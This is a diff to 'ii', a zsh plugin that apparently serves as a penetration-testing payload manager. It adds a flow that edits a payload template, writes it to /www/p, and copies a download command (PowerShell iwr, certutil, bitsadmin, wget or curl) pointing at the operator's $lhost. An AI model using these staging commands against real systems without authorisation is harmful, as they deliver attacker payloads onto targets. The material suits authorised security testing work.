@@ -14,17 +14,20 @@ usage: ii payload [CATEGORY]
 Payload files:
   Open the payload selector, render the selected template, and print the output.
 
-  The selector shows a single-line template preview in the list and a full
-  selected template preview at the bottom, with renderable tokens highlighted.
+  The selector shows payload paths in the list and a selected template preview
+  at the bottom, with renderable tokens highlighted.
   A first-line "# description: ..." metadata line is shown in preview but
   omitted from copied output.
   "# stage: ..." metadata lines are emitted as paste-safe "# --- ... ---"
   comment delimiters for combo payloads.
   The selector starts in normal mode. Press / to search; Esc returns to normal.
   Use y to copy the selected rendered payload without leaving the selector.
+  Use w to edit the selected template, write it to /www/p, and copy a download
+  command.
   Use l to unfold the selected script into a full preview, and h to
   return to compact normal mode. In unfolded preview, j and k still move
-  between payloads, Enter still renders and outputs, and q aborts.
+  between payloads, Enter still renders and outputs, w writes/downloads, and q
+  aborts.
   Payload files render $name, ${name}, and ${name:t}. Shell values win over ii
   tmux values. Uppercase shell variables such as $RHOST are left unchanged.
   Missing values keep their original token.
@@ -42,6 +45,15 @@ Output:
   output. With no PATH, output goes to /www/p/att.txt. A bare filename writes
   to /www/FILENAME. Directory paths use att.txt. After rendering, ii prints the
   output file note and ends with the absolute output path on its own line.
+
+Write/download flow:
+  Press w in the payload selector to edit the selected template in
+  ${VISUAL:-${EDITOR:-vi}}. Save and quit the editor to continue, or quit
+  without writing to abort. Then enter a filename, default p, and select one
+  download command style: powershell-iwr, cmd-certutil, cmd-bitadmin,
+  linux-wget, or linux-curl. ii writes the rendered edited script to /www/p,
+  copies the rendered download command, and prints the render report. Esc or q
+  in the filename or method selector aborts the whole flow.
 
 /www helpers:
   ii p -www ln SOURCE_PATH [LINK_NAME]
@@ -121,8 +133,10 @@ EOF
       return
     fi
 
+    selected="$(ii_fzf_trim_leading_empty_lines "$selected")"
+    [[ -n "$selected" ]] || return
     key="${selected%%$'\n'*}"
-    if [[ "$key" == "enter" || "$key" == "y" || "$key" == "q" ]]; then
+    if [[ "$key" == "enter" || "$key" == "y" || "$key" == "w" || "$key" == "q" ]]; then
       line="${selected#*$'\n'}"
     else
       key="enter"
@@ -140,6 +154,11 @@ EOF
     payload="$(ii_payload_path_for "$selected")" || return
     ii_payload_render "$payload" >/dev/null || return
     rendered="$II_PAYLOAD_RENDERED_TEXT"
+
+    if [[ "$key" == "w" ]]; then
+      ii_payload_write_download_flow "$payload"
+      return
+    fi
 
     if [[ "$key" == "y" ]]; then
       report="$(ii_payload_render_report)"
@@ -290,37 +309,35 @@ ii_payload_filter() {
 ii_payload_select_fzf() {
   local filter="${1:-all}"
   local footer_status="${2:-}"
-  local plugin_file payload_dir compact_footer expanded_footer search_footer normal_keys
+  local plugin_file payload_dir compact_footer expanded_footer search_footer normal_keys compact_preview_cmd expanded_preview_cmd search_preview_cmd
   plugin_file="${II_PLUGIN_DIR%/}/ii.plugin.zsh"
   payload_dir="$(ii_payload_dir)"
   compact_footer="$(ii_interact_footer "$(ii_interact_keys_payload_normal)" "$footer_status")"
   expanded_footer="$(ii_interact_footer "$(ii_interact_keys_payload_expanded)" "$footer_status")"
   search_footer="$(ii_interact_footer "$(ii_interact_keys_payload_search)" "$footer_status")"
-  normal_keys="j,k,y,q,l,h,/"
+  normal_keys="j,k,y,w,q,l,h,/"
+  compact_preview_cmd="II_FZF_FOOTER=${(q)compact_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"
+  expanded_preview_cmd="II_FZF_FOOTER=${(q)expanded_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"
+  search_preview_cmd="II_FZF_FOOTER=${(q)search_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"
 
-  fzf --ansi --prompt="ii payload:${filter}> " --height=80% --border --delimiter=$'\t' --with-nth=1,2,3,4 \
+  fzf --ansi --prompt="ii payload:${filter}> " --height=80% --border --delimiter=$'\t' --with-nth=1 \
     --expect=enter \
     --bind="start:$(ii_fzf_modal_start_actions)" \
-    --bind="/:$(ii_fzf_modal_search_actions "$search_footer" "$normal_keys")" \
-    --bind="esc:$(ii_fzf_modal_normal_actions "$compact_footer" "$normal_keys")" \
-    --bind='j:down,k:up,y:print(y)+accept,q:abort' \
-    --bind="l:change-preview-window(up,99%,wrap,noinfo)+hide-input+disable-search+change-footer($expanded_footer)+unbind(/)+rebind(j,k,y,q,l,h)" \
-    --bind="h:change-preview-window(down,50%,nowrap,noinfo)+hide-input+disable-search+change-footer($compact_footer)+rebind($normal_keys)" \
-    --preview="zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}" \
+    --bind="/:show-input+enable-search+change-preview($search_preview_cmd)+unbind($normal_keys)" \
+    --bind="esc:clear-query+hide-input+disable-search+change-preview($compact_preview_cmd)+rebind($normal_keys)" \
+    --bind='j:down,k:up,y:print(y)+accept,w:print(w)+accept,q:abort' \
+    --bind="l:change-preview-window(up,99%,wrap,noinfo)+change-preview($expanded_preview_cmd)+hide-input+disable-search+unbind(/)+rebind(j,k,y,w,q,l,h)" \
+    --bind="h:change-preview-window(down,50%,nowrap,noinfo)+change-preview($compact_preview_cmd)+hide-input+disable-search+rebind($normal_keys)" \
+    --preview="$compact_preview_cmd" \
     --preview-window='down,50%,nowrap,noinfo' \
-    --footer="$compact_footer" --footer-border=line
+    --no-separator
 }
 
 ii_payload_entries_for_fzf() {
-  local selected payload preview_text preview overflow
+  local selected
   while IFS= read -r selected; do
     [[ -n "$selected" ]] || continue
-    payload="$(ii_payload_path_for "$selected")" || return
-    preview_text="$(ii_payload_preview_text "$payload")" || return
-    preview="$(ii_one_line_preview "$preview_text" 96)"
-    overflow=""
-    [[ "$preview" != "$preview_text" ]] && overflow="$(ii_color_red more)"
-    print -r -- "$selected"$'\t'"$(ii_color_blue "■")"$'\t'"$(ii_payload_highlight_preview_text "$preview")"$'\t'"$overflow"
+    print -r -- "$selected"
   done
 }
 
@@ -408,6 +425,178 @@ ii_payload_print_output_report() {
   print
   ii_color_blue "payload output written to:"
   print -r -- "$II_PAYLOAD_OUTPUT_PATH"
+}
+
+ii_payload_write_download_flow() {
+  local payload_path="$1"
+  local template edited filename method rendered report output_path command copy_rc
+
+  template="$(ii_payload_preview_text "$payload_path")" || return
+  edited="$(ii_payload_edit_template "$template")" || return
+  [[ -n "$edited" ]] || return
+  filename="$(ii_payload_prompt_download_filename)" || return
+  method="$(ii_payload_select_download_method "$filename")" || return
+  output_path="$(ii_payload_www_script_path "$filename")" || return
+
+  ii_payload_render_text "$edited" >/dev/null || return
+  rendered="$II_PAYLOAD_RENDERED_TEXT"
+  ii_payload_write_text_file "$rendered" "$output_path" || return
+
+  ii_payload_build_download_command "$method" "$filename" || return
+  command="$II_PAYLOAD_DOWNLOAD_COMMAND"
+  report="$(ii_payload_render_report)"
+
+  if ii_clip_copy "$command"; then
+    copy_rc=0
+  else
+    copy_rc=1
+  fi
+
+  if (( copy_rc == 0 )); then
+    print "download command copied"
+  else
+    print "download command rendered; clipboard copy failed"
+  fi
+  [[ -n "$report" ]] && print && print -r -- "$report"
+  typeset -g II_PAYLOAD_OUTPUT_PATH="${output_path:a}"
+  ii_payload_print_output_report
+}
+
+ii_payload_edit_template() {
+  local template="$1"
+  local tmp before after edited editor
+  local -a editor_words
+
+  if [[ -n "${II_PAYLOAD_EDIT_ABORT:-}" ]]; then
+    return 1
+  fi
+  if [[ -v II_PAYLOAD_EDIT_TEXT ]]; then
+    print -rn -- "$II_PAYLOAD_EDIT_TEXT"
+    return
+  fi
+
+  tmp="$(mktemp /tmp/ii-payload-edit.XXXXXX)" || return
+  print -rn -- "$template" > "$tmp" || return
+  before="$(ii_payload_file_stamp "$tmp")"
+  editor="${VISUAL:-${EDITOR:-vi}}"
+  editor_words=(${(z)editor})
+  if (( ${#editor_words[@]} == 0 )); then
+    editor_words=(vi)
+  fi
+  if ! command "${editor_words[@]}" "$tmp"; then
+    command rm -f -- "$tmp" >/dev/null 2>&1
+    return 1
+  fi
+  after="$(ii_payload_file_stamp "$tmp")"
+  if [[ "$after" == "$before" ]]; then
+    command rm -f -- "$tmp" >/dev/null 2>&1
+    return 1
+  fi
+  edited="$(<"$tmp")"
+  command rm -f -- "$tmp" >/dev/null 2>&1
+  [[ -n "$edited" ]] || return 1
+  print -rn -- "$edited"
+}
+
+ii_payload_file_stamp() {
+  local path="$1"
+  command stat -c '%y' "$path" 2>/dev/null || command stat -f '%m' "$path" 2>/dev/null
+}
+
+ii_payload_prompt_download_filename() {
+  local raw filename
+
+  if [[ -v II_PAYLOAD_WRITE_NAME_FILTER ]]; then
+    raw="$II_PAYLOAD_WRITE_NAME_FILTER"
+  else
+    raw="$(ii_fzf_input_value "" --prompt='write filename> ' --query='p' --height=40% --border --footer='Return Continue    Esc/q Abort' --bind='q:abort')" || return
+  fi
+  filename="${raw:-p}"
+  if ! ii_payload_valid_download_filename "$filename"; then
+    print -u2 "ii: invalid filename: $filename"
+    return 1
+  fi
+  print -r -- "$filename"
+}
+
+ii_payload_valid_download_filename() {
+  local filename="$1"
+  [[ -n "$filename" && "$filename" != "." && "$filename" != ".." && "$filename" != */* && "$filename" != *$'\0'* ]]
+}
+
+ii_payload_select_download_method() {
+  local filename="$1"
+  local filter="${II_PAYLOAD_DOWNLOAD_METHOD_FILTER:-}"
+  local root
+  root="$(ii_www_root)"
+
+  {
+    print -r -- "powershell-iwr"
+    print -r -- "cmd-certutil"
+    print -r -- "cmd-bitadmin"
+    print -r -- "linux-wget"
+    print -r -- "linux-curl"
+  } | ii_fzf_select_one "$filter" --prompt='download method> ' --height=40% --border \
+    --preview="printf 'filename \"%s\" will be written to \"%s\"' ${(q)filename} ${(q)root}/p" \
+    --footer='Enter Select    Esc/q Abort' --bind='q:abort'
+}
+
+ii_payload_www_script_path() {
+  local filename="$1"
+  local root dir
+
+  root="$(ii_www_root)"
+  dir="${root%/}/p"
+  print -r -- "${dir}/${filename}"
+}
+
+ii_payload_write_text_file() {
+  local text="$1"
+  local output_path="$2"
+  local dir="${output_path:h}"
+
+  if ! mkdir -p -- "$dir"; then
+    print -u2 "ii: failed to create output directory: $dir"
+    return 1
+  fi
+  if ! print -rn -- "$text" > "$output_path"; then
+    print -u2 "ii: failed to write output file: $output_path"
+    return 1
+  fi
+}
+
+ii_payload_build_download_command() {
+  local method="$1"
+  local filename="$2"
+  local resolved_lhost url
+
+  typeset -g II_PAYLOAD_DOWNLOAD_COMMAND=""
+
+  ii_payload_resolve_render_var lhost "" '$lhost'
+  resolved_lhost="$II_PAYLOAD_RESOLVED_VALUE"
+  url="http://${resolved_lhost}/p/${filename}"
+
+  case "$method" in
+    powershell-iwr)
+      II_PAYLOAD_DOWNLOAD_COMMAND="powershell -c \"iwr -UseBasicParsing '${url}' -OutFile \\\"${filename}\\\"\""
+      ;;
+    cmd-certutil)
+      II_PAYLOAD_DOWNLOAD_COMMAND="certutil -urlcache -f ${url} ${filename}"
+      ;;
+    cmd-bitadmin)
+      II_PAYLOAD_DOWNLOAD_COMMAND="bitsadmin /transfer ii ${url} %TEMP%\\${filename}"
+      ;;
+    linux-wget)
+      II_PAYLOAD_DOWNLOAD_COMMAND="wget ${url} -O ${filename}"
+      ;;
+    linux-curl)
+      II_PAYLOAD_DOWNLOAD_COMMAND="curl -fsSL ${url} -o ${filename}"
+      ;;
+    *)
+      print -u2 "ii: unknown download method: $method"
+      return 1
+      ;;
+  esac
 }
 
 ii_payload_read_input() {
@@ -618,11 +807,12 @@ ii_payload_preview() {
 
 ii_payload_preview_fzf() {
   local selected="$1"
+  local footer="${2:-}"
   local payload description preview_text
   payload="$(ii_payload_path_for "$selected")" || return
   description="$(ii_payload_description "$payload")"
   preview_text="$(ii_payload_preview_text "$payload")" || return
-  ii_payload_highlight_preview_text "$preview_text" | ii_fzf_print_preview_blocks "$description" ""
+  ii_payload_highlight_preview_text "$preview_text" | ii_fzf_print_preview_blocks "$description" "$footer"
 }
 
 ii_payload_preview_text() {
